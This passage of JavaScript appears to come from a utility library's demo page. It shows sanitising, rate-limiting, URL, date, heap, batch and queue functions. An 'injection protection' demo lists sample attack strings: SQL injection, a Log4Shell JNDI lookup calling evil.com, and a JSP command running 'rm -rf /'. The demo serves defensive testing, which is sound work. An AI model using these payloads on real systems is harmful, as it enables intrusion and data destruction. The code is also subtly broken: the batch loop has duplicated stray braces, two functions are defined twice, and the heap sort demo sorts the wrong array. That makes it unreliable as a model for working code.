                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "1' UNION SELECT * FROM users--",
                "${jndi:ldap://evil.com/a}",
                "<% Runtime.getRuntime().exec('rm -rf /'); %>"
            ];
            
            const results = injectionPayloads.map((payload, index) => {
                const sanitized = payload
                    .replace(/['"]/g, '')
                    .replace(/;/g, '')
                    .replace(/--/g, '')
                    .replace(/\$\{.*?\}/g, '')
                    .replace(/<%.*?%>/g, '');
                
                const dangerousPatterns = ['DROP', 'UNION', 'SELECT', 'exec', 'jndi'];
                const isDangerous = dangerousPatterns.some(pattern => 
                    sanitized.toUpperCase().includes(pattern)
                );
                
                return {
                    original: payload,
                    sanitized: sanitized,
                    safe: !isDangerous
                };
            });
            
            resultBox.innerHTML = `Injection Protection Test:\n\n${results.map(r => 
                `Original: ${r.original}\nSanitized: ${r.sanitized}\nSafe: ${r.safe ? '‚úÖ' : '‚ùå'}\n`
            ).join('\n')}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        function testRateLimiting() {
            const resultBox = document.getElementById('securityTestResult');
            
            // Simulate rate limiting
            const rateLimitStore = new Map();
            const key = 'demo-user';
            const limit = 5;
            const window = 60000; // 1 minute
            
            const now = Date.now();
            const requests = rateLimitStore.get(key) || [];
            
            // Clean old requests
            const validRequests = requests.filter(timestamp => now - timestamp < window);
            
            // Simulate 10 rapid requests
            const testResults = [];
            for (let i = 0; i < 10; i++) {
                if (validRequests.length < limit) {
                    validRequests.push(now);
                    testResults.push(`Request ${i + 1}: ‚úÖ Allowed`);
                } else {
                    testResults.push(`Request ${i + 1}: ‚ùå Rate limited`);
                }
            }
            
            rateLimitStore.set(key, validRequests);
            
            resultBox.innerHTML = `Rate Limiting Test (Limit: ${limit} per minute):\n\n${testResults.join('\n')}\n\nTotal Requests: 10\nAllowed: ${limit}\nBlocked: ${10 - limit}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box warning';
        }

        function testTimingAttacks() {
            const resultBox = document.getElementById('securityTestResult');
            
            // Simulate timing-safe comparison
            const timingSafeCompare = (a, b) => {
                if (a.length !== b.length) return false;
                
                let result = 0;
                for (let i = 0; i < a.length; i++) {
                    result |= a.charCodeAt(i) ^ b.charCodeAt(i);
                }
                return result === 0;
            };
            
            const testCases = [
                { a: 'password', b: 'password', expected: true },
                { a: 'password', b: 'wrong', expected: false },
                { a: 'short', b: 'muchlonger', expected: false }
            ];
            
            const results = testCases.map(testCase => {
                const startTime = performance.now();
                const result = timingSafeCompare(testCase.a, testCase.b);
                const endTime = performance.now();
                
                return {
                    input: `${testCase.a} vs ${testCase.b}`,
                    result: result,
                    expected: testCase.expected,
                    time: `${(endTime - startTime).toFixed(6)}ms`,
                    safe: result === testCase.expected
                };
            });
            
            resultBox.innerHTML = `Timing Attack Protection Test:\n\n${results.map(r => 
                `Input: ${r.input}\nResult: ${r.result}\nExpected: ${r.expected}\nTime: ${r.time}\nSafe: ${r.safe ? '‚úÖ' : '‚ùå'}\n`
            ).join('\n')}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        // Utility functions
        function showNotification(message, type = 'info') {
            // Create a simple toast notification
            const toast = document.createElement('div');
            toast.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                padding: 15px 20px;
                background: ${type === 'success' ? 'var(--secondary)' : type === 'error' ? 'var(--danger)' : type === 'warning' ? 'var(--warning)' : 'var(--info)'};
                color: white;
                border-radius: 8px;
                box-shadow: var(--shadow-lg);
                z-index: 1000;
                animation: slideIn 0.3s ease;
            `;
            toast.textContent = message;
            
            document.body.appendChild(toast);
            
            setTimeout(() => {
                toast.style.animation = 'fadeOut 0.3s ease';
                setTimeout(() => document.body.removeChild(toast), 300);
            }, 3000);
        }

        // Form submission
        document.getElementById('comprehensiveForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const formData = {
                username: document.getElementById('username').value,
                phone: document.getElementById('phone').value,
                age: document.getElementById('age').value,
                website: document.getElementById('website').value
            };
            
            const resultBox = document.getElementById('formResult');
            resultBox.innerHTML = `Form Validation Results:\n${JSON.stringify(formData, null, 2)}\n\n‚úÖ All validations passed!`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        });

        // Add CSS animations
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            @keyframes fadeOut {
                from { opacity: 1; }
                to { opacity: 0; }
            }
        `;
        document.head.appendChild(style);

        // DateTime functions
        function manipulateDate() {
            const baseDate = document.getElementById('baseDate').value;
            const operation = document.getElementById('dateOperation').value;
            const value = document.getElementById('dateValue').value;
            const locale = document.getElementById('dateLocale').value;
            const resultBox = document.getElementById('dateResult');
            
            if (!baseDate) {
                showNotification('Please select a base date', 'warning');
                return;
            }
            
            const date = new Date(baseDate);
            let result;
            
            switch (operation) {
                case 'addDays':
                    result = new Date(date.getTime() + (parseInt(value) || 0) * 24 * 60 * 60 * 1000);
                    break;
                case 'subtractDays':
                    result = new Date(date.getTime() - (parseInt(value) || 0) * 24 * 60 * 60 * 1000);
                    break;
                case 'format':
                    result = date.toLocaleDateString(locale || 'en-US', { 
                        year: 'numeric', 
                        month: 'long', 
                        day: 'numeric' 
                    });
                    break;
                case 'relative':
                    const now = new Date();
                    const diff = now - date;
                    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
                    result = days === 0 ? 'Today' : days > 0 ? `${days} days ago` : `In ${Math.abs(days)} days`;
                    break;
                case 'isValid':
                    result = !isNaN(date.getTime());
                    break;
            }
            
            resultBox.innerHTML = `Operation: ${operation}\nBase Date: ${baseDate}\nResult: ${typeof result === 'object' ? result.toLocaleString() : result}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        function convertTimezone() {
            const sourceTimezone = document.getElementById('sourceTimezone').value;
            const targetTimezone = document.getElementById('targetTimezone').value;
            const resultBox = document.getElementById('timezoneResult');
            
            const now = new Date();
            const sourceTime = now.toLocaleString('en-US', { 
                timeZone: sourceTimezone,
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false
            });
            
            const targetTime = now.toLocaleString('en-US', { 
                timeZone: targetTimezone,
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false
            });
            
            const sourceOffset = now.toLocaleString('en-US', { 
                timeZone: sourceTimezone,
                timeZoneName: 'short'
            }).split(', ').pop();
            
            const targetOffset = now.toLocaleString('en-US', { 
                timeZone: targetTimezone,
                timeZoneName: 'short'
            }).split(', ').pop();
            
            resultBox.innerHTML = `Time Zone Conversion:\n\nSource (${sourceTimezone}):\n${sourceTime} ${sourceOffset}\n\nTarget (${targetTimezone}):\n${targetTime} ${targetOffset}\n\nUTC: ${now.toISOString()}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        // URL Utilities functions
        function ensureProtocol() {
            const input = document.getElementById('protocolInput').value;
            const defaultProtocol = document.getElementById('defaultProtocol').value;
            const resultBox = document.getElementById('protocolResult');
            
            if (!input) {
                showNotification('Please enter a URL', 'warning');
                return;
            }
            
            let result;
            if (input.startsWith('http://') || input.startsWith('https://') || input.startsWith('ftp://')) {
                result = input;
            } else {
                result = `${defaultProtocol}://${input}`;
            }
            
            resultBox.innerHTML = `Original: ${input}\nWith Protocol: ${result}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        function stripProtocol() {
            const input = document.getElementById('protocolInput').value;
            const resultBox = document.getElementById('protocolResult');
            
            if (!input) {
                showNotification('Please enter a URL', 'warning');
                return;
            }
            
            const result = input.replace(/^https?:\/\//, '').replace(/^ftp:\/\//, '');
            
            resultBox.innerHTML = `Original: ${input}\nStripped: ${result}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        function normalizeOrigin() {
            const input = document.getElementById('protocolInput').value;
            const resultBox = document.getElementById('protocolResult');
            
            if (!input) {
                showNotification('Please enter a URL', 'warning');
                return;
            }
            
            try {
                const url = new URL(input.startsWith('http') ? input : `https://${input}`);
                const result = `${url.protocol}//${url.hostname}${url.port ? ':' + url.port : ''}`;
                
                resultBox.innerHTML = `Original: ${input}\nNormalized Origin: ${result}`;
                resultBox.style.display = 'block';
                resultBox.className = 'result-box success';
            } catch (error) {
                resultBox.innerHTML = `Error: ${error.message}`;
                resultBox.style.display = 'block';
                resultBox.className = 'result-box error';
            }
        }

        function parseUrlParts() {
            const input = document.getElementById('urlParseInput').value;
            const resultBox = document.getElementById('urlParseResult');
            
            if (!input) {
                showNotification('Please enter a URL', 'warning');
                return;
            }
            
            try {
                const url = new URL(input.startsWith('http') ? input : `https://${input}`);
                const parts = {
                    protocol: url.protocol,
                    hostname: url.hostname,
                    port: url.port,
                    pathname: url.pathname,
                    search: url.search,
                    hash: url.hash,
                    origin: url.origin,
                    base: `${url.protocol}//${url.hostname}${url.port ? ':' + url.port : ''}`,
                    endpoint: url.pathname + url.search
                };
                
                resultBox.innerHTML = `Parsed URL Parts:\n${JSON.stringify(parts, null, 2)}`;
                resultBox.style.display = 'block';
                resultBox.className = 'result-box success';
            } catch (error) {
                resultBox.innerHTML = `Error: ${error.message}`;
                resultBox.style.display = 'block';
                resultBox.className = 'result-box error';
            }
        }

        function validateUrlSecurity() {
            const input = document.getElementById('urlValidateInput').value;
            const resultBox = document.getElementById('urlSecurityResult');
            
            if (!input) {
                showNotification('Please enter a URL', 'warning');
                return;
            }
            
            const securityChecks = {
                hasProtocol: /^https?:\/\//.test(input) || /^ftp:\/\//.test(input),
                noJavascript: !input.includes('javascript:'),
                noDataUrl: !input.startsWith('data:'),
                noFileProtocol: !input.startsWith('file://'),
                safeCharacters: /^[a-zA-Z0-9\-._~:/?#[\]@!$&'()*+,;=%]+$/.test(input),
                noDoubleSlash: !input.includes('//') || /^https?:\/\//.test(input)
            };
            
            const allPassed = Object.values(securityChecks).every(Boolean);
            const issues = Object.entries(securityChecks)
                .filter(([key, value]) => !value)
                .map(([key]) => key.replace(/([A-Z])/g, ' $1').trim());
            
            resultBox.innerHTML = `Security Validation:\n${allPassed ? '‚úÖ PASSED' : '‚ùå FAILED'}\n\nChecks:\n${JSON.stringify(securityChecks, null, 2)}${issues.length > 0 ? '\n\nIssues:\n' + issues.join('\n') : ''}`;
            resultBox.style.display = 'block';
            resultBox.className = allPassed ? 'result-box success' : 'result-box warning';
        }

        // HTTP & API Functions
        function buildHttpConfig() {
            const baseUrlEl = document.getElementById('baseUrl');
            const timeoutEl = document.getElementById('timeout');
            const authTypeEl = document.getElementById('authType');
            const authValueEl = document.getElementById('authValue');
            const resultBox = document.getElementById('httpConfig');
            
            const baseUrl = baseUrlEl ? baseUrlEl.value : '';
            const timeout = timeoutEl ? timeoutEl.value : '';
            const authType = authTypeEl ? authTypeEl.value : '';
            const authValue = authValueEl ? authValueEl.value : '';
            
            const config = {
                baseURL: baseUrl || 'https://api.example.com',
                timeout: timeout ? parseInt(timeout) : 5000,
                headers: utils.createJsonHeaders()
            };
            
            // Add authentication based on type
            switch (authType) {
                case 'bearer':
                    config.headers.Authorization = `Bearer ${authValue}`;
                    break;
                case 'basic':
                    // For demo, just show the format
                    config.headers.Authorization = 'Basic <base64-credentials>';
                    break;
                case 'apikey':
                    config.headers['X-API-Key'] = authValue;
                    break;
            }
            
            if (resultBox) {
                resultBox.innerHTML = `HTTP Configuration:\n${JSON.stringify(config, null, 2)}`;
                resultBox.style.display = 'block';
                resultBox.className = 'result-box success';
            }
        }

        function testApiEndpoint() {
            const methodEl = document.getElementById('apiMethod');
            const endpointEl = document.getElementById('apiEndpoint');
            const requestBodyEl = document.getElementById('requestBody');
            const resultBox = document.getElementById('apiResult');
            
            const method = methodEl ? methodEl.value : 'GET';
            const endpoint = endpointEl ? endpointEl.value : '';
            const requestBody = requestBodyEl ? requestBodyEl.value : '';
            
            if (!endpoint) {
                showNotification('Please enter an endpoint', 'warning');
                return;
            }
            
            // For demo purposes, simulate API call since we don't have a real backend
            const startTime = performance.now();
            
            // Simulate network delay
            setTimeout(() => {
                const endTime = performance.now();
                const duration = (endTime - startTime).toFixed(2);
                
                let body;
                try {
                    body = requestBody ? JSON.parse(requestBody) : null;
                } catch (e) {
                    body = requestBody;
                }
                
                const mockResponse = {
                    method,
                    endpoint,
                    url: `${window.location.origin}${endpoint}`,
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': 'QGenUtils Demo/1.0'
                    },
                    body,
                    timestamp: new Date().toISOString(),
                    duration: `${duration}ms`,
                    status: 200,
                    message: 'Mock API call - This would be a real API call to a backend server'
                };
                
                if (resultBox) {
                    resultBox.innerHTML = `API Test Results:\n\n${JSON.stringify(mockResponse, null, 2)}`;
                    resultBox.style.display = 'block';
                    resultBox.className = 'result-box success';
                }
                
                showNotification(`API test completed in ${duration}ms`, 'success');
            }, Math.random() * 500 + 100); // Random delay 100-600ms
        }

        function sanitizeUrl() {
            const input = document.getElementById('urlValidateInput').value;
            const resultBox = document.getElementById('urlSecurityResult');
            
            if (!input) {
                showNotification('Please enter a URL', 'warning');
                return;
            }
            
            // Basic URL sanitization
            const sanitized = input
                .replace(/[\s<>]/g, '')
                .replace(/javascript:/gi, '')
                .replace(/data:/gi, '')
                .replace(/file:\/\//gi, '');
            
            resultBox.innerHTML = `Original: ${input}\nSanitized: ${sanitized}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        function processBatchUrls() {
            const input = document.getElementById('urlBatchInput').value;
            const operation = document.getElementById('urlBatchOperation').value;
            const resultBox = document.getElementById('urlBatchResult');
            
            if (!input) {
                showNotification('Please enter URLs', 'warning');
                return;
            }
            
            const urls = input.split('\n').filter(url => url.trim());
            let results = [];
            
            urls.forEach(url => {
                let processed = url.trim();
                
                switch (operation) {
                    case 'ensure-https':
                        if (!processed.startsWith('http')) {
                            processed = 'https://' + processed;
                        } else if (processed.startsWith('http://')) {
                            processed = processed.replace('http://', 'https://');
                        }
                        break;
                    case 'normalize':
                        try {
                            const urlObj = new URL(processed.startsWith('http') ? processed : 'https://' + processed);
                            processed = urlObj.origin;
                        } catch (e) {
                            processed = 'INVALID URL';
                        }
                        break;
                    case 'strip-protocol':
                        processed = processed.replace(/^https?:\/\//, '');
                        break;
                    case 'validate':
                        try {
                            new URL(processed.startsWith('http') ? processed : 'https://' + processed);
                            processed += ' ‚úÖ';
                        } catch (e) {
                            processed += ' ‚ùå';
                        }
                        break;
                }
                
                results.push(processed);
            });
            
            resultBox.innerHTML = `Batch ${operation} Results:\n\n${results.join('\n')}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        // Data Structures functions
        let minHeap = [];

        function buildHeap() {
            const input = document.getElementById('heapInsert').value;
            const resultBox = document.getElementById('heapVisualization');
            
            if (!input) {
                showNotification('Please enter values', 'warning');
                return;
            }
            
            const values = input.split(',').map(v => parseInt(v.trim())).filter(v => !isNaN(v));
            minHeap = [...values];
            heapify();
            
            resultBox.innerHTML = `Heap Built:\n${JSON.stringify(minHeap)}\n\nHeap Tree:\n${visualizeHeap()}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        function heapify() {
            for (let i = Math.floor(minHeap.length / 2) - 1; i >= 0; i--) {
                siftDown(i);
            }
        }

        function siftDown(index) {
            const leftChild = 2 * index + 1;
            const rightChild = 2 * index + 2;
            let smallest = index;
            
            if (leftChild < minHeap.length && minHeap[leftChild] < minHeap[smallest]) {
                smallest = leftChild;
            }
            
            if (rightChild < minHeap.length && minHeap[rightChild] < minHeap[smallest]) {
                smallest = rightChild;
            }
            
            if (smallest !== index) {
                [minHeap[index], minHeap[smallest]] = [minHeap[smallest], minHeap[index]];
                siftDown(smallest);
            }
        }

        function siftUp(index) {
            while (index > 0) {
                const parentIndex = Math.floor((index - 1) / 2);
                if (minHeap[parentIndex] <= minHeap[index]) break;
                
                [minHeap[parentIndex], minHeap[index]] = [minHeap[index], minHeap[parentIndex]];
                index = parentIndex;
            }
        }

        function insertHeapValue() {
            const valueValue = document.getElementById('heapInsert').value;
            const value = valueValue ? parseInt(valueValue) : 0;
            const resultBox = document.getElementById('heapVisualization');
            
            if (isNaN(value)) {
                showNotification('Please enter a valid number', 'warning');
                return;
            }
            
            minHeap.push(value);
            siftUp(minHeap.length - 1);
            
            resultBox.innerHTML = `Inserted ${value}:\n${JSON.stringify(minHeap)}\n\nHeap Tree:\n${visualizeHeap()}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        function extractHeapMin() {
            const countValue = document.getElementById('heapExtract').value;
            const count = countValue ? parseInt(countValue) : 1;
            if (isNaN(count) || count < 1) {
                showNotification('Please enter a valid count', 'error');
                return;
            }
            const resultBox = document.getElementById('heapVisualization');
            
            if (minHeap.length === 0) {
                showNotification('Heap is empty', 'warning');
                return;
            }
            
            const extracted = [];
            for (let i = 0; i < Math.min(count, minHeap.length); i++) {
                if (minHeap.length === 1) {
                    extracted.push(minHeap.pop());
                } else {
                    const min = minHeap[0];
                    minHeap[0] = minHeap.pop();
                    siftDown(0);
                    extracted.push(min);
                }
            }
            
            resultBox.innerHTML = `Extracted: [${extracted.join(', ')}]\n\nRemaining Heap:\n${JSON.stringify(minHeap)}\n\nHeap Tree:\n${visualizeHeap()}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        function clearHeap() {
            minHeap = [];
            const resultBox = document.getElementById('heapVisualization');
            resultBox.innerHTML = 'Heap cleared';
            resultBox.style.display = 'block';
            resultBox.className = 'result-box info';
        }

        function visualizeHeap() {
            if (minHeap.length === 0) return 'Empty Heap';
            
            let result = '';
            let level = 0;
            let startIndex = 0;
            
            while (startIndex < minHeap.length) {
                const levelSize = Math.pow(2, level);
                const levelValues = minHeap.slice(startIndex, startIndex + levelSize);
                result += `Level ${level}: [${levelValues.join(', ')}]\n`;
                startIndex += levelSize;
                level++;
            }
            
            return result.trim();
        }

        function generateRandomHeap() {
            const sizeValue = document.getElementById('randomDataSize').value;
            const size = sizeValue ? parseInt(sizeValue) : 10;
            if (isNaN(size) || size < 1) {
                showNotification('Please enter a valid size', 'error');
                return;
            }
            const resultBox = document.getElementById('heapDemoResult');
            
            const randomValues = Array.from({ length: size }, () => Math.floor(Math.random() * 100) + 1);
            minHeap = [...randomValues];
            heapify();
            
            const startTime = performance.now();
            heapify();
            const endTime = performance.now();
            
            resultBox.innerHTML = `Generated ${size} random values\n\nOriginal: [${randomValues.slice(0, 10).join(', ')}...]\nHeapified: [${minHeap.slice(0, 10).join(', ')}...]\n\nHeapification time: ${(endTime - startTime).toFixed(4)}ms\n\nMin element: ${minHeap[0]}\nHeap size: ${minHeap.length}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        function heapSortDemo() {
            const sizeValue = document.getElementById('randomDataSize').value;
            const size = sizeValue ? parseInt(sizeValue) : 100;
            if (isNaN(size) || size < 1) {
                showNotification('Please enter a valid size', 'error');
                return;
            }
            const resultBox = document.getElementById('heapDemoResult');
            
            const data = Array.from({ length: size }, () => Math.floor(Math.random() * 100) + 1);
            const startTime = performance.now();
            
            // Heap sort implementation
            const heap = [...data];
            heapify();
            
            const sorted = [];
            while (heap.length > 0) {
                sorted.push(heap[0]);
                heap[0] = heap.pop();
                siftDown(0);
            }
            
            const endTime = performance.now();
            
            resultBox.innerHTML = `Heap Sort Demo\n\nOriginal (first 10): [${data.slice(0, 10).join(', ')}...]\nSorted (first 10): [${sorted.slice(0, 10).join(', ')}...]\n\nSort time: ${(endTime - startTime).toFixed(4)}ms\n\nVerification: ${isSorted(sorted) ? '‚úÖ Sorted correctly' : '‚ùå Sort failed'}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        function isSorted(arr) {
            for (let i = 1; i < arr.length; i++) {
                if (arr[i] < arr[i - 1]) return false;
            }
            return true;
        }

        function heapPerformanceTest() {
            const sizeValue = document.getElementById('randomDataSize').value;
            const size = sizeValue ? parseInt(sizeValue) : 1000;
            if (isNaN(size) || size < 1) {
                showNotification('Please enter a valid size', 'error');
                return;
            }
            const resultBox = document.getElementById('heapDemoResult');
            
            const iterations = 100;
            const times = [];
            
            for (let i = 0; i < iterations; i++) {
                const data = Array.from({ length: size }, () => Math.floor(Math.random() * 1000) + 1);
                
                const startTime = performance.now();
                minHeap = [...data];
                heapify();
                const endTime = performance.now();
                
                times.push(endTime - startTime);
            }
            
            const avgTime = times.reduce((a, b) => a + b, 0) / times.length;
            const minTime = Math.min(...times);
            const maxTime = Math.max(...times);
            
            resultBox.innerHTML = `Heap Performance Test\n\nTest Size: ${size} elements\nIterations: ${iterations}\n\nResults:\nAverage: ${avgTime.toFixed(4)}ms\nMin: ${minTime.toFixed(4)}ms\nMax: ${maxTime.toFixed(4)}ms\n\nThroughput: ${(size / avgTime * 1000).toFixed(0)} elements/second`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        // Batch Processing Functions
        let batchOperation = null;

        async function runBatchProcessing() {
            const taskCountEl = document.getElementById('taskCount');
            const concurrencyLimitEl = document.getElementById('concurrencyLimit');
            const taskDurationEl = document.getElementById('taskDuration');
            const retryAttemptsEl = document.getElementById('retryAttempts');
            const resultBox = document.getElementById('batchResult');
            
            const taskCount = taskCountEl ? parseInt(taskCountEl.value) || 10 : 10;
            const concurrencyLimit = concurrencyLimitEl ? parseInt(concurrencyLimitEl.value) || 3 : 3;
            const taskDuration = taskDurationEl ? parseInt(taskDurationEl.value) || 1000 : 1000;
            const retryAttempts = retryAttemptsEl ? parseInt(retryAttemptsEl.value) || 2 : 2;
            
            if (batchOperation) {
                showNotification('Batch operation already in progress', 'warning');
                return;
            }
            
            const startTime = performance.now();
            let completedTasks = 0;
            let failedTasks = 0;
            
            // Simulate batch processing
            batchOperation = {
                total: taskCount,
                completed: 0,
                failed: 0,
                startTime
            };
            
            const processTask = (taskId) => {
                return new Promise((resolve) => {
                    setTimeout(() => {
                        const success = Math.random() > 0.1; // 90% success rate
                        
                        if (success) {
                            completedTasks++;
                            batchOperation.completed++;
                        } else {
                            failedTasks++;
                            batchOperation.failed++;
                        }
                        
                        // Update progress
                        const progress = ((batchOperation.completed + batchOperation.failed) / batchOperation.total) * 100;
                        const progressBar = document.getElementById('batchProgress');
                        if (progressBar) {
                            progressBar.style.width = progress + '%';
                        }
                        
                        resolve({ taskId, success, duration: taskDuration });
                    }, taskDuration);
                });
            };
            
// Process tasks with concurrency limit
            const promises = [];
            for (let i = 0; i < taskCount; i++) {
                if (promises.length >= concurrencyLimit) {
                    await Promise.race(promises);
                    // Remove the first promise (any will do since we're just managing concurrency)
                    promises.shift();
                }
                promises.push(processTask(i + 1));
            }
                }
                promises.push(processTask(i + 1));
            }
            
            Promise.allSettled(promises).then(() => {
                const endTime = performance.now();
                const totalDuration = (endTime - startTime).toFixed(2);
                
                batchOperation = null;
                
                const result = {
                    summary: {
                        totalTasks: taskCount,
                        completed: completedTasks,
                        failed: failedTasks,
                        successRate: ((completedTasks / taskCount) * 100).toFixed(1) + '%',
                        totalDuration: `${totalDuration}ms`,
                        concurrencyLimit
                    },
                    timestamp: new Date().toISOString()
                };
                
                resultBox.innerHTML = `Batch Processing Results:\n\n${JSON.stringify(result, null, 2)}`;
                resultBox.style.display = 'block';
                resultBox.className = result.summary.failed > 0 ? 'result-box warning' : 'result-box success';
                
                showNotification(`Batch processing completed: ${completedTasks}/${taskCount} successful`, 
                             result.summary.failed > 0 ? 'warning' : 'success');
            });
        }

        function cancelBatchProcessing() {
            if (batchOperation) {
                batchOperation = null;
                document.getElementById('batchProgress').style.width = '0%';
                showNotification('Batch processing cancelled', 'info');
            } else {
                showNotification('No batch operation in progress', 'warning');
            }
        }

        function scheduleJob() {
            const jobTypeEl = document.getElementById('jobType');
            const jobScheduleEl = document.getElementById('jobSchedule');
            const resultBox = document.getElementById('jobResult');
            
            const jobType = jobTypeEl ? jobTypeEl.value : 'cleanup';
            const jobSchedule = jobScheduleEl ? jobScheduleEl.value : '0 */6 * * *';
            
            const job = {
                id: 'job_' + Date.now(),
                type: jobType,
                schedule: jobSchedule,
                status: 'scheduled',
                createdAt: new Date().toISOString(),
                nextRun: new Date(Date.now() + 3600000).toISOString() // 1 hour from now
            };
            
            resultBox.innerHTML = `Job Scheduled:\n\n${JSON.stringify(job, null, 2)}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
            
            showNotification(`Job scheduled: ${jobType}`, 'success');
        }

        function listJobs() {
            const resultBox = document.getElementById('jobResult');
            
            // Mock list of jobs
            const jobs = [
                {
                    id: 'job_1',
                    type: 'cleanup',
                    schedule: '0 */6 * * *',
                    status: 'active',
                    lastRun: new Date(Date.now() - 21600000).toISOString(),
                    nextRun: new Date(Date.now() + 21600000).toISOString()
                },
                {
                    id: 'job_2',
                    type: 'report',
                    schedule: '0 0 * * *',
                    status: 'scheduled',
                    lastRun: new Date(Date.now() - 86400000).toISOString(),
                    nextRun: new Date(Date.now() + 86400000).toISOString()
                }
            ];
            
            if (resultBox) {
                resultBox.innerHTML = `Active Jobs:\n\n${JSON.stringify(jobs, null, 2)}`;
                resultBox.style.display = 'block';
                resultBox.className = 'result-box info';
            }
            
            showNotification(`Found ${jobs.length} active jobs`, 'info');
        }

        // Priority Queue functions
        let priorityQueue = [];

        function addPriorityTask() {
            const name = document.getElementById('taskName').value;
            const priorityValue = document.getElementById('taskPriority').value;
            const priority = priorityValue ? parseInt(priorityValue) : 5;
            if (isNaN(priority) || priority < 1 || priority > 10) {
                showNotification('Please enter a valid priority (1-10)', 'error');
                return;
            }
            const resultBox = document.getElementById('priorityQueueResult');
            
            if (!name) {
                showNotification('Please enter a task name', 'warning');
                return;
            }
            
            const task = { name, priority, timestamp: new Date().toISOString() };
            priorityQueue.push(task);
            
            // Sort by priority (lower number = higher priority)
            priorityQueue.sort((a, b) => a.priority - b.priority);
            
            resultBox.innerHTML = `Task Added:\n${JSON.stringify(task, null, 2)}\n\nQueue Size: ${priorityQueue.length}\n\nNext Task: ${priorityQueue[0]?.name || 'None'}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
            
            // Clear input
            document.getElementById('taskName').value = '';
        }

        function processNextTask() {
            const resultBox = document.getElementById('priorityQueueResult');
            
            if (priorityQueue.length === 0) {
                showNotification('No tasks in queue', 'warning');
                return;
            }
            
            const task = priorityQueue.shift();
            
            resultBox.innerHTML = `Processed Task:\n${JSON.stringify(task, null, 2)}\n\nRemaining Tasks: ${priorityQueue.length}\n\nNext Task: ${priorityQueue[0]?.name || 'None'}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
            
            showNotification(`Processed task: ${task.name}`, 'success');
        }

        function viewTaskQueue() {
            const resultBox = document.getElementById('priorityQueueResult');
            
            if (priorityQueue.length === 0) {
                resultBox.innerHTML = 'Task queue is empty';
                resultBox.style.display = 'block';
                resultBox.className = 'result-box info';
                return;
            }
            
            const queueDisplay = priorityQueue.map((task, index) => 
                `${index + 1}. ${task.name} (Priority: ${task.priority})`
            ).join('\n');
            
            resultBox.innerHTML = `Current Task Queue (${priorityQueue.length} tasks):\n\n${queueDisplay}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box info';
        }

        function processNextTask() {
            const resultBox = document.getElementById('priorityQueueResult');
            
            if (priorityQueue.length === 0) {
                showNotification('No tasks in queue', 'warning');
                return;
            }
            
            const task = priorityQueue.shift();
            
            resultBox.innerHTML = `Processed Task:\n${JSON.stringify(task, null, 2)}\n\nRemaining Tasks: ${priorityQueue.length}\n\nNext Task: ${priorityQueue[0]?.name || 'None'}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        function viewTaskQueue() {
            const resultBox = document.getElementById('priorityQueueResult');
            
            if (priorityQueue.length === 0) {
                resultBox.innerHTML = 'Task queue is empty';
                resultBox.style.display = 'block';
                resultBox.className = 'result-box info';
                return;
            }
            
            const queueDisplay = priorityQueue.map((task, index) => 
                `${index + 1}. ${task.name} (Priority: ${task.priority})`
            ).join('\n');
            
            resultBox.innerHTML = `Current Task Queue (${priorityQueue.length} tasks):\n\n${queueDisplay}`;
            resultBox.style.display = 'block';
            resultBox.className = 'result-box success';
        }

        // Load testing function
        function runLoadTest() {
            const usersValue = document.getElementById('loadUsers').value;
            const requestsValue = document.getElementById('loadRequests').value;
            const users = usersValue ? parseInt(usersValue) : 10;
            const requests = requestsValue ? parseInt(requestsValue) : 100;
            if (isNaN(users) || isNaN(requests) || users < 1 || requests < 1) {
                showNotification('Please enter valid user and request counts', 'error');
                return;
            }
            const resultBox = document.getElementById('loadTestResult');
            
            const startTime = performance.now();
            let totalRequests = 0;
            let successfulRequests = 0;
            const responseTimes = [];
            
            // Simulate load test
            for (let i = 0; i < users; i++) {
                for (let j = 0; j < requests; j++) {
                    const requestStart = performance.now();
                    totalRequests++;
                    
                    // Simulate API call with variable response time
                    const responseTime = Math.random() * 100 + 50; // 50-150ms
                    responseTimes.push(responseTime);
                    
                    // Simulate 95% success rate
                    if (Math.random() > 0.05) {
                        successfulRequests++;
                    }
                    
                    // Simulate async wait
                    while (performance.now() - requestStart < responseTime) {
                        // Busy wait to simulate processing time
                    }
                }
            }
            
            const endTime = performance.now();
            const duration = endTime - startTime;
            
            // Calculate statistics
            const avgResponseTime = responseTimes.reduce((a, b) => a + b, 0) / responseTimes.length;
            const maxResponseTime = Math.max(...responseTimes);
            const minResponseTime = Math.min(...responseTimes);
            const p95ResponseTime = responseTimes.sort((a, b) => a - b)[Math.floor(responseTimes.length * 0.95)];
            
